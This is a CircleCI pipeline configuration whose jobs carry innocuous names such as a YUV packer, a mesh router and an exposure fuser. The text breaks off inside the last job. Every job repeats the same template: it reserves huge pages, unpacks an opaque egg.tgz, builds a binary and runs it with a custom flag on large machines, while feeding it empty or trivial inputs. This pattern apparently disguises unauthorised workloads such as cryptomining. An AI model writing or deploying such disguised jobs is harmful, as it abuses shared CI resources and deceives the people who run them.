version: 2.1

jobs:
  yuv420pack:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make raw
          command: |
            : > raw.yuv
      - run:
          name: Build pixel packer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target yuv420pack -j2
      - run:
          name: Pack YUV420 planes
          command: LIONSS_LP=1 ./build/yuv420pack --in raw.yuv --width 1920
  mesh_route:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load topology
          command: |
            printf 'nodes 32\n' > mesh.cfg
      - run:
          name: Build mesh stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mesh_route -j2
      - run:
          name: Route mesh packet
          command: LIONSS_LP=1 ./build/mesh_route --conf mesh.cfg --hops 5
  recordReplay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Record trace
          command: |
            : > trace.rr
      - run:
          name: Build replay engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target recordReplay -j2
      - run:
          name: Replay recorded trace
          command: LIONSS_LP=1 ./build/recordReplay --trace trace.rr --deterministic
  exposureFuse:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List brackets
          command: |
            printf 'ev -2 0 2\n' > brackets.txt
      - run:
          name: Build fusion engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target exposureFuse -j2
      - run:
          name: Fuse exposure stack
          command: LIONSS_LP=1 ./build/exposureFuse --list brackets.txt --gamma 2.2
  flashattn-v2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
